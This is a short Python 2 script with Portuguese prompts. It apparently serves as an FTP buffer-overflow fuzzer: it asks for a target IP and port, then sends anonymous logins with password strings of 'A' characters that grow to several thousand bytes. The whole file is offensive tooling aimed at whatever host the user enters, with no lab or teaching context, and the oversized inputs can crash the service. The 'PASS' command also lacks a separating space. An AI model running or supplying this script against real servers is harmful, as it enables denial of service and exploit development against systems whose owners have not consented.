#!/usr/bin/python
#-*-coding: utf-8-*-

import socket

ip = raw_input("➤➤ Digite o IP do alvo: ")
porta = int(input("➤➤ Digite a porta do alvo: "))
buffer   = ["A"]
contador = 100
while len(buffer) <= 30:
    buffer.append("A"*contador)
    contador=contador+200

for string in buffer:
    print"➤➤ Fazendo fuzzing na senha com {} bytes".format(len(string))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,porta))
    s.recv(1024)
    s.send("USER anonymous\r\n")
    s.recv(1024)
    s.send("PASS"+string+"\r\n")
    s.send("QUIT\r\n")
    
